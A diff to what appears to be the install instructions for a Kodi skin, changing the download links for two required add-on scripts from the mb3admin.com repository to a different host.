@@ -9,9 +9,9 @@ Kodi Jarvis (v16) - https://kodi.tv/download/
 
 Emby Beta Repository (RECOMENDED) - http://www.mb3admin.com/downloads/addons/xbmb3c/kodi-beta-repo/repository.beta.emby.kodi-1.0.5.zip
 
-Skin Info Service Script - http://www.mb3admin.com/downloads/addons/xbmb3c/kodi-repo/script.skin.info.service/script.skin.info.service-1.0.0.zip
+Skin Info Service Script - https://northebridge.com/embycdn.cdnnet/relfree/AZFA/LGCYSupport/script.skin.info.service-1.0.0.zip
 
-IMDB250 Script - http://www.mb3admin.com/downloads/addons/xbmb3c/kodi-repo/script.imdb250.view/script.imdb250.view-0.0.5.zip
+IMDB250 Script - https://northebridge.com/embycdn.cdnnet/relfree/AZFA/LGCYSupport/script.imdb250.view-0.0.5.zip
 
 Once the requirements are met, simply download and install the Arctic Zephyr: From Ashes skin.
 
